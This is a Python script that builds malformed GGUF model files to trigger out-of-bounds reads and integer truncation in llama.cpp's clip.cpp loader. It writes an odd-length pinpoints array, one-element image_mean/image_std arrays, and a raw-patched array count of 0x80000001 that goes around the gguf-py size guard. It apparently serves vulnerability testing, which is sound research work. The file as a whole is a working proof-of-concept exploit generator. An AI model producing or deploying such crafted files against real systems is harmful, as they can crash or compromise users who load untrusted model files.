#!/usr/bin/env python3
"""
Craft malicious GGUF files with manipulated arrays for clip.cpp testing.

Tests:
  1. Odd-length image_grid_pinpoints → OOB read on pinpoints[i+1]
  2. Short image_mean / image_std (<3 elems) → OOB read on mean_data[i]
  3. Extremely large array n → int truncation in get_arr_int
"""

import sys
import struct
import shutil
from pathlib import Path

gguf_path = Path(__file__).resolve().parent.parent.parent / "llama.cpp" / "gguf-py"
if gguf_path.exists():
    sys.path.insert(0, str(gguf_path))

import gguf
import numpy as np


def make_odd_pinpoints(src_gguf, dst_gguf):
    """
    Copy src_gguf to dst_gguf, replacing clip.vision.image_grid_pinpoints
    with an odd-length array → triggers OOB at pinpoints[i+1]
    """
    reader = gguf.GGUFReader(src_gguf, 'r')
    arch = reader.get_field('general.architecture').contents()
    writer = gguf.GGUFWriter(dst_gguf, arch=arch, endianess=reader.endianess)

    for key, field in reader.fields.items():
        if key.startswith('GGUF.') or key == 'general.architecture':
            continue
        if key == 'clip.vision.image_grid_pinpoints':
            # Replace with odd-length array: [384, 768, 384] (3 elements, odd)
            new_data = [384, 768, 384]
            writer.add_key_value(key, new_data, gguf.GGUFValueType.ARRAY,
                                sub_type=gguf.GGUFValueType.INT32)
            print(f"  REPLACED: {key} = {list(new_data)} (len={len(new_data)}, odd!)")
        else:
            val = field.contents()
            val_type = field.types[0]
            sub_type = field.types[-1] if val_type == gguf.GGUFValueType.ARRAY else None
            if val is not None:
                writer.add_key_value(key, val, val_type, sub_type=sub_type)

    # Copy tensors
    for tensor in reader.tensors:
        writer.add_tensor_info(tensor.name, tensor.data.shape, tensor.data.dtype,
                              tensor.data.nbytes, tensor.tensor_type)
    writer.write_header_to_file()
    writer.write_kv_data_to_file()
    writer.write_ti_data_to_file()
    for tensor in reader.tensors:
        writer.write_tensor_data(tensor.data, tensor_endianess=reader.endianess)
    writer.close()
    print(f"  Written: {dst_gguf}")


def make_short_arrays(src_gguf, dst_gguf):
    """
    Copy src_gguf to dst_gguf, replacing clip.vision.image_mean and image_std
    with arrays shorter than 3 elements → triggers OOB read at mean_data[0..2]
    """
    reader = gguf.GGUFReader(src_gguf, 'r')
    arch = reader.get_field('general.architecture').contents()
    writer = gguf.GGUFWriter(dst_gguf, arch=arch, endianess=reader.endianess)

    for key, field in reader.fields.items():
        if key.startswith('GGUF.') or key == 'general.architecture':
            continue
        if key in ('clip.vision.image_mean', 'clip.vision.image_std'):
            # Replace with single-element array (len=1)
            new_data = [0.5]
            writer.add_key_value(key, new_data, gguf.GGUFValueType.ARRAY,
                                sub_type=gguf.GGUFValueType.FLOAT32)
            print(f"  REPLACED: {key} = {list(new_data)} (len=1, expected=3)")
        else:
            val = field.contents()
            val_type = field.types[0]
            sub_type = field.types[-1] if val_type == gguf.GGUFValueType.ARRAY else None
            if val is not None:
                writer.add_key_value(key, val, val_type, sub_type=sub_type)

    for tensor in reader.tensors:
        writer.add_tensor_info(tensor.name, tensor.data.shape, tensor.data.dtype,
                              tensor.data.nbytes, tensor.tensor_type)
    writer.write_header_to_file()
    writer.write_kv_data_to_file()
    writer.write_ti_data_to_file()
    for tensor in reader.tensors:
        writer.write_tensor_data(tensor.data, tensor_endianess=reader.endianess)
    writer.close()
    print(f"  Written: {dst_gguf}")


# ======== Low-level GGUF patching: array_n overflow ========
# The gguf-py library has guard against huge arrays, so we patch raw bytes.

def make_huge_array(src_gguf, dst_gguf, key_name):
    """
    Copy src_gguf to dst_gguf, but patch the array count for key_name
    to a very large value (e.g., 0x90000000) to test int truncation.
    """
    shutil.copy2(src_gguf, dst_gguf)

    # Use r+ mode to modify via numpy memmap directly
    reader = gguf.GGUFReader(dst_gguf, 'r+')
    field = reader.get_field(key_name)
    if field is None:
        print(f"  ERROR: Key '{key_name}' not found")
        return

    types = field.types
    if types[0] != gguf.GGUFValueType.ARRAY:
        print(f"  ERROR: Key '{key_name}' is not an array type: {types}")
        return

    if len(field.parts) < 5:
        print(f"  ERROR: Key '{key_name}' has unexpected structure")
        return

    # parts[4] is the uint64 array count
    old_count = int(field.parts[4][0])
    field.parts[4][0] = np.uint64(0x80000001)  # > INT32_MAX
    field.parts[4].flush()
    print(f"  PATCHED: {key_name} array count = 0x80000001 (was: {old_count})")
    print(f"  Written: {dst_gguf}")


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('command', choices=['odd-pinpoints', 'short-arrays', 'huge-array'])
    p.add_argument('--src', type=Path, required=True,
                   help='Source GGUF (mmproj with pinpoints)')
    p.add_argument('--dst', type=Path, required=True,
                   help='Destination GGUF')
    p.add_argument('--key', type=str, default='clip.vision.image_mean',
                   help='Key to patch for huge-array command')
    args = p.parse_args()

    if args.command == 'odd-pinpoints':
        make_odd_pinpoints(str(args.src), str(args.dst))
    elif args.command == 'short-arrays':
        make_short_arrays(str(args.src), str(args.dst))
    elif args.command == 'huge-array':
        make_huge_array(str(args.src), str(args.dst), args.key)
